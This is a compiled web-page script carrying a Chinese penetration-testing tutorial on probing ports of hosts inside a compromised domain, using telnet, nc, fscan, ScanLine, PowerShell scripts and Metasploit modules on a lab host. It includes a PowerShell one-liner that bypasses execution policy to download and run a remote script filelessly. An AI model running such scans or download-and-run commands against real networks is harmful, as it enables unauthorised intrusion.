(window.webpackJsonp=window.webpackJsonp||[]).push([[62],{794:function(s,e,a){"use strict";a.r(e);var n=a(105),t=Object(n.a)({},(function(){var s=this,e=s.$createElement,a=s._self._c||e;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"前言"}},[s._v("前言 "),a("a",{staticClass:"header-anchor",attrs:{href:"#前言"}},[s._v("#")])]),s._v(" "),a("blockquote",[a("p",[s._v("注：本文中的工具均来源自互联网，后门自查。工具可在狼盘下载 pan.wgpsec.org")])]),s._v(" "),a("p",[s._v("在进入目标域后，对域内存活主机进行端口探测是经常要做的一步，在此记录一些常见的方法。")]),s._v(" "),a("h2",{attrs:{id:"_1、telnet"}},[s._v("1、Telnet "),a("a",{staticClass:"header-anchor",attrs:{href:"#_1、telnet"}},[s._v("#")])]),s._v(" "),a("p",[s._v("如果想探测某台主机的某个端口是否开放，直接使用 telnet 命令是最方便的。")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("C:\\Users\\daniel10>telnet dc 80\n正在连接dc...无法打开到主机的连接。 在端口 80: 连接失败\n\nC:\\Users\\daniel10>telnet 192.168.7.7 443\n正在连接192.168.7.7...无法打开到主机的连接。 在端口 443: 连接失败\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("h2",{attrs:{id:"_2、nc"}},[s._v("2、nc "),a("a",{staticClass:"header-anchor",attrs:{href:"#_2、nc"}},[s._v("#")])]),s._v(" "),a("p",[s._v("素有瑞士军刀之称的 nc 也是可以拿来做端口探测的。")]),s._v(" "),a("p",[s._v("nc 下载地址："),a("a",{attrs:{href:"https://eternallybored.org/misc/netcat/",target:"_blank",rel:"noopener noreferrer"}},[s._v("https://eternallybored.org/misc/netcat/"),a("OutboundLink")],1)]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("nc.exe -vv 192.168.7.7 3389\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("C:\\Users\\daniel10>nc.exe -vv 192.168.7.7 3389\nDNS fwd/rev mismatch: DC != DC.teamssix.com\nDC [192.168.7.7] 3389 (ms-wbt-server) open\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[s._v("拿来进行多个端口扫描也是可以的，就是扫描速度有点慢")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("nc.exe -rz -w 2 -vv 192.168.7.7 0-65535\n\n-r 随机指定本地与远端主机的通信端口\n-z 使用0输入/输出模式，只在扫描通信端口时使用\n-w<超时秒数> 设置等待连线的时间\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("C:\\Users\\daniel10>nc.exe -rz -w 2 -vv 192.168.7.7 443-445\nDNS fwd/rev mismatch: DC != DC.teamssix.com\nDC [192.168.7.7] 444 (?): TIMEDOUT\nDC [192.168.7.7] 443 (https): TIMEDOUT\nDC [192.168.7.7] 445 (microsoft-ds) open\nsent 0, rcvd 0\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br")])]),a("h2",{attrs:{id:"_3、fscan"}},[s._v("3、fscan "),a("a",{staticClass:"header-anchor",attrs:{href:"#_3、fscan"}},[s._v("#")])]),s._v(" "),a("p",[s._v("影舞者大佬写的一款工具，使用起来感觉很是方便，项目地址："),a("a",{attrs:{href:"https://github.com/shadow1ng/fscan",target:"_blank",rel:"noopener noreferrer"}},[s._v("https://github.com/shadow1ng/fscan"),a("OutboundLink")],1)]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("fscan.exe -h 192.168.7.7 -p 22,445\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("C:\\Users\\daniel10>fscan.exe -h 192.168.7.7 -p 22,445\n\n   ___                              _\n  / _ \\     ___  ___ _ __ __ _  ___| | __\n / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /\n/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   <\n\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\\n                     fscan version: 1.5.1\nscan start\n(icmp) Target '192.168.7.7' is alive\nicmp alive hosts len is: 1\n192.168.7.7:445 open\n[+] 192.168.7.7 MS17-010        (Windows Server 2008 R2 Datacenter 7601 Service Pack 1)\nscan end\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br")])]),a("h2",{attrs:{id:"_4、scanline"}},[s._v("4、ScanLine "),a("a",{staticClass:"header-anchor",attrs:{href:"#_4、scanline"}},[s._v("#")])]),s._v(" "),a("p",[s._v("McAfee 出品的一款经典的端口扫描工具，ScanLine 项目地址："),a("a",{attrs:{href:"www.mcafee.com/us/downloads/free-tools/termsofuse.aspx"}},[s._v("www.mcafee.com/us/downloads/free-tools/termsofuse.aspx")])]),s._v(" "),a("p",[s._v("但是项目地址的下载按钮貌似失效了，其他的下载地址："),a("a",{attrs:{href:"https://www.lanzous.com/i32zncf",target:"_blank",rel:"noopener noreferrer"}},[s._v("https://www.lanzous.com/i32zncf"),a("OutboundLink")],1)]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("scanline.exe -h -t 22,80,445,3389 -p 192.168.7.7\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("C:\\Users\\daniel10>scanline.exe -h -t 22,80,445,3389 -p 192.168.7.7\n\nScanLine (TM) 1.01\nCopyright (c) Foundstone, Inc. 2002\nhttp://www.foundstone.com\nScan of 1 IP started at Wed Feb 24 21:31:11 2021\n-------------------------------------------------------------------------------\n192.168.7.7\nResponds with ICMP unreachable: No\nTCP ports: 445 3389\n-------------------------------------------------------------------------------\nScan finished at Wed Feb 24 21:31:15 2021\n1 IP and 4 ports scanned in 0 hours 0 mins 4.03 secs\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br")])]),a("h2",{attrs:{id:"_5、s-扫描器"}},[s._v("5、S 扫描器 "),a("a",{staticClass:"header-anchor",attrs:{href:"#_5、s-扫描器"}},[s._v("#")])]),s._v(" "),a("p",[s._v("S 扫描器支持大网段扫描，扫描速度也很快，是比较早期的一款扫描工具了，比较适合运行在 Windows Server 2003 以下版本的操作系统中，下载地址："),a("a",{attrs:{href:"https://pan.baidu.com/s/1gdGM4F5",target:"_blank",rel:"noopener noreferrer"}},[s._v("https://pan.baidu.com/s/1gdGM4F5"),a("OutboundLink")],1)]),s._v(" "),a("blockquote",[a("p",[s._v("值得提一句的是在我下载该工具到本地后，火绒立马给它删了，而其他的扫描工具火绒都没告警。")])]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("s.exe tcp 192.168.7.7 22,80,443,445 7\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("C:\\Users\\daniel10>s.exe tcp 192.168.7.7 22,80,443,445 7\nTCP Port Scanner V1.1 By WinEggDrop\n\nNormal Scan: About To Scan 4 Ports Using 7 Thread\n192.168.7.7      445   Open\nScan 192.168.7.7 Complete In 0 Hours 0 Minutes 3 Seconds. Found 1 Open Ports\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br")])]),a("h2",{attrs:{id:"_6、powershell-脚本"}},[s._v("6、PowerShell 脚本 "),a("a",{staticClass:"header-anchor",attrs:{href:"#_6、powershell-脚本"}},[s._v("#")])]),s._v(" "),a("h3",{attrs:{id:"powersploit"}},[s._v("PowerSploit "),a("a",{staticClass:"header-anchor",attrs:{href:"#powersploit"}},[s._v("#")])]),s._v(" "),a("p",[s._v("PowerSploit 的 Invoke-Portscan 脚本下载地址："),a("a",{attrs:{href:"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1",target:"_blank",rel:"noopener noreferrer"}},[s._v("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1"),a("OutboundLink")],1)]),s._v(" "),a("p",[s._v("无文件形式（推荐）")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1');Invoke-Portscan -Hosts 192.168.7.7 -T 4 -ports '445,1433,80,8080,3389'\"\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("blockquote",[a("p",[s._v("如果报错，估计是网络的问题")])]),s._v(" "),a("p",[s._v("有文件形式")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("powershell.exe -exec bypass -Command \"Import-Module ./Invoke-Portscan.ps1;Invoke-Portscan -Hosts 192.168.7.7 -T 4 -ports '445,1433,80,8080,3389'\"\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("C:\\Users\\daniel10>powershell.exe -exec bypass -Command \"Import-Module ./Invoke-Portscan.ps1;Invoke-Portscan -Ho\nsts 192.168.7.7 -T 4 -ports '445,1433,80,8080,3389'\"\n\nHostname      : 192.168.7.7\nalive         : True\nopenPorts     : {445, 3389}\nclosedPorts   : {8080, 80, 1433}\nfilteredPorts : {}\nfinishTime    : 2021/2/24 下午 21:14:06\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br")])]),a("h3",{attrs:{id:"nishang"}},[s._v("nishang "),a("a",{staticClass:"header-anchor",attrs:{href:"#nishang"}},[s._v("#")])]),s._v(" "),a("p",[s._v("nishang 的 Invoke-Portscan 脚本下载地址："),a("a",{attrs:{href:"https://raw.githubusercontent.com/samratashok/nishang/0090ba2e51b7503c3245081894c0fc87b696f941/Scan/Invoke-PortScan.ps1",target:"_blank",rel:"noopener noreferrer"}},[s._v("https://raw.githubusercontent.com/samratashok/nishang/0090ba2e51b7503c3245081894c0fc87b696f941/Scan/Invoke-PortScan.ps1"),a("OutboundLink")],1)]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v(" Invoke-PortScan -StartAddress 192.168.7.7 -EndAddress 192.168.7.7 -ScanPort -Port 80,443,445\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("PS C:\\Users\\daniel10> Import-Module .\\Invoke-Portscan.ps1\nPS C:\\Users\\daniel10> Invoke-PortScan -StartAddress 192.168.7.7 -EndAddress 192.168.7.7 -ScanPort -Port 80,443,445\n\nIPAddress   HostName Ports\n---------   -------- -----\n192.168.7.7          {445}\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br")])]),a("h2",{attrs:{id:"_7、msf"}},[s._v("7、MSF "),a("a",{staticClass:"header-anchor",attrs:{href:"#_7、msf"}},[s._v("#")])]),s._v(" "),a("p",[s._v("万能的 MSF 自然也是能够进行端口探测的，MSF 中用于端口探测的模块有：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("auxiliary/scanner/portscan/ack          TCP ACK端口扫描\nauxiliary/scanner/portscan/ftpbounce    FTP bounce端口扫描\nauxiliary/scanner/portscan/syn         \tSYN端口扫描\nauxiliary/scanner/portscan/tcp          TCP端口扫描  \nauxiliary/scanner/portscan/xmas         TCP XMas端口扫描\n……\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br")])]),a("p",[s._v("除了上述工具外，还有 nmap、masscan 什么的就不多说了，读者如果感兴趣可以自行尝试玩玩。")]),s._v(" "),a("blockquote",[a("p",[s._v("参考文章：")]),s._v(" "),a("p",[a("a",{attrs:{href:"https://pingmaoer.github.io/2020/03/30/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%80/",target:"_blank",rel:"noopener noreferrer"}},[s._v("https://pingmaoer.github.io/2020/03/30/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%80/"),a("OutboundLink")],1)])])])}),[],!1,null,null,null);e.default=t.exports}}]);